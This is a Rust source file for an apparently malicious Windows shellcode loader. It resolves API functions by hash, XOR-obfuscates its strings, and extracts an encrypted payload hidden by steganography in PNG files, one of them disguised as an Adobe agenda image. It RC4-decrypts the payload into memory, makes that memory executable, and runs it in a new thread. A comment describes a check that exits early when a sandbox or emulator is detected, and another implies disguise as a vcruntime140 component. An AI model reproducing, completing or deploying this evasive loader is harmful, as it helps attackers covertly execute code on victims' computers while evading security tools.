use anyhow::{bail, Context, Result};
use std::ffi::c_void;
use std::ptr::null_mut;

use crate::resolve::{
    self, CloseHandleFn, CreateThreadFn, ExpandEnvironmentStringsWFn, GetModuleFileNameWFn,
    GetModuleHandleExWFn, NtAllocateVirtualMemoryFn, NtProtectVirtualMemoryFn,
    WaitForSingleObjectFn, HMODULE, HASH_ExpandEnvironmentStringsW, HASH_GetModuleFileNameW,
    HASH_GetModuleHandleExW, HASH_CloseHandle, HASH_CreateThread, HASH_NtAllocateVirtualMemory,
    HASH_NtProtectVirtualMemory, HASH_WaitForSingleObject, INFINITE, MAX_PATH,
    MEM_COMMIT, MEM_RESERVE, NT_CURRENT_PROCESS, PAGE_EXECUTE_READ, PAGE_READWRITE,
    GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
};

const E_PNG_EXT: [u8; 4] = [0x17, 0x48, 0x5d, 0x55];
const E_SHELL_PNG: [u8; 35] = [
    0x6e, 0x51, 0x5d, 0x56, 0x08, 0x11, 0x41, 0x4c, 0x20, 0x5e, 0x56, 0x2a, 0x55, 0x61, 0x44,
    0x0a, 0x4b, 0x0d, 0x4a, 0x62, 0x53, 0x0b, 0x4c, 0x44, 0x03, 0x6e, 0x13, 0x49, 0x54, 0x5d,
    0x55, 0x16, 0x43, 0x5c, 0x00,
];
const PNG_SIG: [u8; 8] = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a];
const SIZE_CURSOR: usize = 2;
const PAYLOAD_CURSOR: usize = 34;
const E_ADOBE_AGENDA_PNG: [u8; 77] = [
    0x1c, 0x68, 0x41, 0x5d, 0x00, 0x14, 0x53, 0x0f, 0x27, 0x53, 0x4d, 0x3e, 0x14, 0x6e, 0x71, 0x01,
    0x56, 0x0a, 0x01, 0x6d, 0x71, 0x31, 0x64, 0x75, 0x30, 0x25, 0x21, 0x45, 0x54, 0x43, 0x66, 0x0a,
    0x05, 0x1c, 0x57, 0x56, 0x03, 0x4c, 0x51, 0x03, 0x0c, 0x69, 0x02, 0x6e, 0x74, 0x0a, 0x4e, 0x06,
    0x08, 0x5e, 0x51, 0x07, 0x5a, 0x75, 0x23, 0x27, 0x25, 0x4f, 0x55, 0x50, 0x66, 0x09, 0x06, 0x1f,
    0x56, 0x5f, 0x6d, 0x54, 0x4e, 0x00, 0x09, 0x6d, 0x07, 0x1c, 0x40, 0x0b, 0x5e,
];

pub static mut PAYLOAD_HMODULE: HMODULE = null_mut();

include!(concat!(env!("OUT_DIR"), "/key.rs"));

fn rc4_into(key: &[u8], data: &[u8], out: &mut [u8]) {
    assert_eq!(data.len(), out.len());
    let mut s: [u8; 256] = core::array::from_fn(|i| i as u8);
    let mut j = 0usize;
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) % 256;
        s.swap(i, j);
    }
    let (mut i, mut j) = (0usize, 0usize);
    for (dst, &b) in out.iter_mut().zip(data.iter()) {
        i = (i + 1) % 256;
        j = (j + s[i] as usize) % 256;
        s.swap(i, j);
        *dst = b ^ s[(s[i] as usize + s[j] as usize) % 256];
    }
}

#[inline(never)]
fn payload_self_anchor() {}

unsafe fn k32_fn<T>(hash: u32) -> Result<T> {
    let p = resolve::resolve_k32(hash).context("resolve_k32")?;
    Ok(std::mem::transmute_copy(&p))
}

unsafe fn nt_fn<T>(hash: u32) -> Result<T> {
    let p = resolve::resolve_nt(hash).context("resolve_nt")?;
    Ok(std::mem::transmute_copy(&p))
}

unsafe fn self_payload_module() -> Result<HMODULE> {
    let get_module_handle_ex_w: GetModuleHandleExWFn = k32_fn(HASH_GetModuleHandleExW)?;
    let mut hmod = null_mut();
    let addr = payload_self_anchor as *const () as *const u16;
    if get_module_handle_ex_w(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        addr,
        &mut hmod,
    ) == 0
    {
        bail!("GetModuleHandleExW failed");
    }
    Ok(hmod)
}

fn module_dir_wide() -> Result<Vec<u16>> {
    unsafe {
        let hmod = self_payload_module()?;
        let get_module_file_name_w: GetModuleFileNameWFn = k32_fn(HASH_GetModuleFileNameW)?;
        let mut path = vec![0u16; MAX_PATH as usize];
        let n = get_module_file_name_w(hmod, path.as_mut_ptr(), path.len() as u32);
        if n == 0 || n as usize >= path.len() {
            bail!("GetModuleFileNameW failed");
        }
        path.truncate(n as usize);
        let slash = path
            .iter()
            .rposition(|&c| c == b'\\' as u16 || c == b'/' as u16)
            .context("no directory in module path")?;
        path.truncate(slash + 1);
        Ok(path)
    }
}

fn paeth(a: u8, b: u8, c: u8) -> u8 {
    let p = i16::from(a) + i16::from(b) - i16::from(c);
    let pa = (p - i16::from(a)).abs();
    let pb = (p - i16::from(b)).abs();
    let pc = (p - i16::from(c)).abs();
    if pa <= pb && pa <= pc {
        a
    } else if pb <= pc {
        b
    } else {
        c
    }
}

fn unfilter_row(filter: u8, row: &mut [u8], prev: &[u8]) {
    match filter {
        0 => {}
        1 => {
            for i in 1..row.len() {
                row[i] = row[i].wrapping_add(row[i - 1]);
            }
        }
        2 => {
            if !prev.is_empty() {
                for (cur, &p) in row.iter_mut().zip(prev.iter()) {
                    *cur = cur.wrapping_add(p);
                }
            }
        }
        3 => {
            for i in 0..row.len() {
                let left = if i > 0 { row[i - 1] } else { 0 };
                let up = prev.get(i).copied().unwrap_or(0);
                row[i] = row[i].wrapping_add(((u16::from(left) + u16::from(up)) / 2) as u8);
            }
        }
        4 => {
            for i in 0..row.len() {
                let left = if i > 0 { row[i - 1] } else { 0 };
                let up = prev.get(i).copied().unwrap_or(0);
                let up_left = if i > 0 { prev[i - 1] } else { 0 };
                row[i] = row[i].wrapping_add(paeth(left, up, up_left));
            }
        }
        _ => {}
    }
}

fn zlib_inflate_all(idat: &[u8]) -> Result<Vec<u8>> {
    use miniz_oxide::inflate::decompress_to_vec_zlib;

    let out = decompress_to_vec_zlib(idat).map_err(|e| {
        anyhow::anyhow!(
            "zlib inflate failed: {} ({} bytes decompressed before error)",
            e,
            e.output.len()
        )
    })?;
    Ok(out)
}

fn decode_png_to_rgba(raw: &[u8]) -> Result<Vec<u8>> {
    if raw.len() < PNG_SIG.len() || raw[..PNG_SIG.len()] != PNG_SIG {
        bail!("not a PNG file");
    }

    let mut width = 0usize;
    let mut height = 0usize;
    let mut bit_depth = 0u8;
    let mut color_type = 0u8;
    let mut interlace = 0u8;
    let mut plte: Vec<u8> = Vec::new();
    let mut trns: Vec<u8> = Vec::new();
    let mut idat = Vec::new();

    let mut off = PNG_SIG.len();
    while off + 12 <= raw.len() {
        let length = u32::from_be_bytes(
            raw[off..off + 4]
                .try_into()
                .map_err(|_| anyhow::anyhow!("bad chunk length"))?,
        ) as usize;
        let ctype = &raw[off + 4..off + 8];
        let end = off + 8 + length;
        if end + 4 > raw.len() {
            bail!("truncated PNG chunk");
        }
        let cdata = &raw[off + 8..end];
        if ctype == b"csTe" {
            bail!("legacy csTe chunk present; re-embed with bit-plane format");
        }
        match ctype {
            b"IHDR" if cdata.len() >= 13 => {
                width = u32::from_be_bytes(cdata[0..4].try_into().unwrap()) as usize;
                height = u32::from_be_bytes(cdata[4..8].try_into().unwrap()) as usize;
                bit_depth = cdata[8];
                color_type = cdata[9];
                interlace = cdata[12];
            }
            b"PLTE" => plte.extend_from_slice(cdata),
            b"tRNS" => trns.extend_from_slice(cdata),
            b"IDAT" => idat.extend_from_slice(cdata),
            _ => {}
        }
        off = end + 4;
        if ctype == b"IEND" {
            break;
        }
    }

    if width == 0 || height == 0 {
        bail!("PNG missing IHDR");
    }
    if interlace != 0 {
        bail!("interlaced PNG not supported");
    }
    if bit_depth != 8 {
        bail!("only 8-bit PNG supported");
    }
    if idat.is_empty() {
        bail!("PNG has no IDAT data");
    }

    let bpp = match color_type {
        2 => 3usize,
        3 => 1usize,
        6 => 4usize,
        _ => bail!("unsupported PNG color type {color_type}"),
    };

    if color_type == 3 && plte.is_empty() {
        bail!("palette PNG missing PLTE");
    }

    let filtered = zlib_inflate_all(&idat)?;
    let stride = width * bpp;
    let row_len = 1 + stride;
    if filtered.len() != height * row_len {
        bail!(
            "unexpected filtered image size (got {}, expected {})",
            filtered.len(),
            height * row_len
        );
    }

    let mut rgba = Vec::with_capacity(width * height * 4);
    let mut prev = vec![0u8; stride];

    for y in 0..height {
        let row_start = y * row_len;
        let filter = filtered[row_start];
        let mut row = filtered[row_start + 1..row_start + 1 + stride].to_vec();
        unfilter_row(filter, &mut row, &prev);
        prev.clone_from(&row);

        match color_type {
            3 => {
                for &idx in &row {
                    let pi = idx as usize * 3;
                    if pi + 2 >= plte.len() {
                        bail!("palette index out of range");
                    }
                    let r = plte[pi];
                    let g = plte[pi + 1];
                    let b = plte[pi + 2];
                    let a = trns.get(idx as usize).copied().unwrap_or(255);
                    rgba.extend_from_slice(&[r, g, b, a]);
                }
            }
            2 => {
                for px in row.chunks_exact(3) {
                    rgba.extend_from_slice(&[px[0], px[1], px[2], 255]);
                }
            }
            6 => rgba.extend_from_slice(&row),
            _ => unreachable!(),
        }
    }

    Ok(rgba)
}

fn extract_byte(start_offset: usize, buf_size: usize, data: &[u8]) -> u8 {
    let mut val = 0u8;
    for i in 0..8usize {
        let bit_cursor = start_offset - 2 + i;
        let byte_index = bit_cursor % buf_size;
        let bit_shift = bit_cursor / buf_size;
        let extracted_bit = (data[byte_index] >> bit_shift) & 1;
        val |= extracted_bit << i;
    }
    val
}

fn bitplane_extract_payload(rgba: &[u8]) -> Result<Vec<u8>> {
    let buf_size = rgba.len();
    if buf_size < 8 {
        bail!("image buffer too small");
    }

    let mut size_bytes = [0u8; 4];
    let mut cursor = SIZE_CURSOR;
    for b in &mut size_bytes {
        *b = extract_byte(cursor, buf_size, rgba);
        cursor += 8;
    }
    let payload_size = u32::from_le_bytes(size_bytes) as usize;
    if payload_size == 0 || payload_size > buf_size {
        bail!("invalid embedded payload size");
    }

    let mut wrapped = vec![0u8; payload_size];
    cursor = PAYLOAD_CURSOR;
    for b in &mut wrapped {
        *b = extract_byte(cursor, buf_size, rgba);
        cursor += 8;
    }

    let mut enc = vec![0u8; payload_size];
    crate::obf::dc_xd(&wrapped, &mut enc);
    Ok(enc)
}

fn parse_png_extract_payload(raw: &[u8]) -> Result<Vec<u8>> {
    let rgba = decode_png_to_rgba(raw)?;
    bitplane_extract_payload(&rgba)
}

fn wide_path_is_file(path: &[u16]) -> bool {
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;

    std::path::Path::new(&OsString::from_wide(path)).is_file()
}

fn expand_obf_path_wide(enc: &[u8]) -> Result<Vec<u16>> {
    let mut narrow = [0u8; 128];
    let n = enc.len().min(narrow.len());
    crate::obf::dc_xd(&enc[..n], &mut narrow[..n]);

    let plain_len = narrow[..n].iter().position(|&b| b == 0).unwrap_or(n);
    let mut wide_in: Vec<u16> = narrow[..plain_len].iter().map(|&b| b as u16).collect();
    wide_in.push(0);
    crate::obf::xe(&mut narrow[..plain_len]);

    let mut wide_out = vec![0u16; MAX_PATH as usize];
    let ret = unsafe {
        let expand: ExpandEnvironmentStringsWFn = k32_fn(HASH_ExpandEnvironmentStringsW)?;
        expand(wide_in.as_ptr(), wide_out.as_mut_ptr(), wide_out.len() as u32)
    };
    if ret == 0 || ret as usize > wide_out.len() {
        bail!("ExpandEnvironmentStringsW failed");
    }
    wide_out.truncate(ret as usize - 1);
    Ok(wide_out)
}

fn primary_adobe_agenda_png_path() -> Result<Vec<u16>> {
    expand_obf_path_wide(&E_ADOBE_AGENDA_PNG)
}

fn companion_png_path() -> Result<Vec<u16>> {
    unsafe {
        let hmod = self_payload_module()?;
        let get_module_file_name_w: GetModuleFileNameWFn = k32_fn(HASH_GetModuleFileNameW)?;
        let mut path = vec![0u16; MAX_PATH as usize];
        let n = get_module_file_name_w(hmod, path.as_mut_ptr(), path.len() as u32);
        if n == 0 || n as usize >= path.len() {
            bail!("GetModuleFileNameW failed");
        }
        path.truncate(n as usize);
        let dot = path
            .iter()
            .rposition(|&c| c == b'.' as u16)
            .context("no extension in module path")?;
        path.truncate(dot);
        let mut ext = [0u8; 4];
        crate::obf::dc_xd(&E_PNG_EXT, &mut ext);
        for &b in &ext {
            path.push(b as u16);
        }
        crate::obf::xe(&mut ext);
        Ok(path)
    }
}

fn fallback_shell_png_path() -> Result<Vec<u16>> {
    let mut path = module_dir_wide()?;
    let mut name = [0u8; 40];
    crate::obf::dc_xd(&E_SHELL_PNG, &mut name);
    let n = name.iter().position(|&b| b == 0).unwrap_or(name.len());
    for &b in &name[..n] {
        path.push(b as u16);
    }
    crate::obf::xe(&mut name[..n]);
    Ok(path)
}

fn push_payload_candidate(paths: &mut Vec<Vec<u16>>, path: Result<Vec<u16>>) {
    if let Ok(p) = path {
        if wide_path_is_file(&p) && !paths.iter().any(|x| x == &p) {
            paths.push(p);
        }
    }
}

fn payload_png_candidates() -> Vec<Vec<u16>> {
    let mut paths = Vec::new();
    push_payload_candidate(&mut paths, primary_adobe_agenda_png_path());
    push_payload_candidate(&mut paths, companion_png_path());
    push_payload_candidate(&mut paths, fallback_shell_png_path());
    paths
}

fn read_png_payload(path: &[u16]) -> Result<Vec<u8>> {
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;

    let raw = std::fs::read(OsString::from_wide(path))
        .with_context(|| format!("read {:?}", OsString::from_wide(path)))?;
    if raw.is_empty() {
        bail!("companion PNG empty");
    }
    parse_png_extract_payload(&raw)
}

fn load_shellcode_enc() -> Result<Vec<u8>> {
    let paths = payload_png_candidates();
    if paths.is_empty() {
        bail!("no payload .png found at any candidate path");
    }
    let mut last_err: Option<anyhow::Error> = None;
    for path in &paths {
        use std::ffi::OsString;
        use std::os::windows::ffi::OsStringExt;
        let path_display = OsString::from_wide(path);
        log_debug(&format!("trying payload {path_display:?}"));
        match read_png_payload(path) {
            Ok(enc) => return Ok(enc),
            Err(e) => {
                log_debug(&format!("payload failed {path_display:?}: {e:#}"));
                last_err = Some(e);
            }
        }
    }
    Err(last_err.unwrap_or_else(|| anyhow::anyhow!("payload .png not found")))
}

pub fn log_debug(msg: &str) {
    use std::io::Write;

    let mut path = vec![0u8; crate::obf::E_LOG_PATH.len() + 1];
    crate::obf::dc_xd(crate::obf::E_LOG_PATH, &mut path[..crate::obf::E_LOG_PATH.len()]);
    let n = path.iter().position(|&b| b == 0).unwrap_or(crate::obf::E_LOG_PATH.len());
    if let Ok(mut f) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(String::from_utf8_lossy(&path[..n]).as_ref())
    {
        let _ = writeln!(f, "{msg}");
    }
    crate::obf::xe(&mut path[..n]);
}

pub fn run_payload_in_process() -> Result<()> {
    // pop_quiz() == true only when ((x^y)&0xFFFF)==0xBEEF (emulator/sandbox signal).
    // vcruntime140.c exits early on true; continue payload on false (real host).
    if crate::obf::pop_quiz() {
        return Ok(());
    }

    log_debug("run_payload_in_process started");

    let mut shellcode_enc = load_shellcode_enc()?;
    let sc_len = shellcode_enc.len();
    log_debug(&format!("shellcode payload: {} bytes (encrypted)", sc_len));

    let mut region_size = (sc_len + 0xFFF) & !0xFFF;
    let mut base: *mut c_void = null_mut();

    let st = unsafe {
        let nt_alloc: NtAllocateVirtualMemoryFn = nt_fn(HASH_NtAllocateVirtualMemory)?;
        nt_alloc(
            NT_CURRENT_PROCESS,
            &mut base,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if st < 0 {
        bail!("NtAllocateVirtualMemory failed: {st:x}");
    }
    log_debug(&format!("allocated RW region at {:?}", base));

    {
        let out = unsafe { std::slice::from_raw_parts_mut(base as *mut u8, sc_len) };
        let mut key = vec![0u8; RC4_KEY_ENC.len()];
        crate::obf::dc_xd(RC4_KEY_ENC, &mut key);
        rc4_into(&key, &shellcode_enc, out);
        crate::obf::xe(&mut key);
    }
    crate::obf::xe(&mut shellcode_enc);
    log_debug("decrypted shellcode into RW region");

    let mut protect_size = region_size;
    let mut old_protect = 0u32;
    let st = unsafe {
        let nt_protect: NtProtectVirtualMemoryFn = nt_fn(HASH_NtProtectVirtualMemory)?;
        nt_protect(
            NT_CURRENT_PROCESS,
            &mut base,
            &mut protect_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };
    if st < 0 {
        bail!("NtProtectVirtualMemory failed: {st:x}");
    }
    log_debug("region flipped to RX");

    let entry: Option<unsafe extern "system" fn(*mut c_void) -> u32> =
        Some(unsafe { std::mem::transmute(base) });

    let hthread = unsafe {
        let create_thread: CreateThreadFn = k32_fn(HASH_CreateThread)?;
        create_thread(null_mut(), 0, entry, null_mut(), 0, null_mut())
    };
    if hthread.is_null() {
        bail!("CreateThread failed");
    }
    log_debug(&format!("CreateThread success: {:?}", hthread));

    unsafe {
        let wait: WaitForSingleObjectFn = k32_fn(HASH_WaitForSingleObject)?;
        wait(hthread, INFINITE);
        let close: CloseHandleFn = k32_fn(HASH_CloseHandle)?;
        close(hthread);
    }

    log_debug("run_payload_in_process finished");
    Ok(())
}
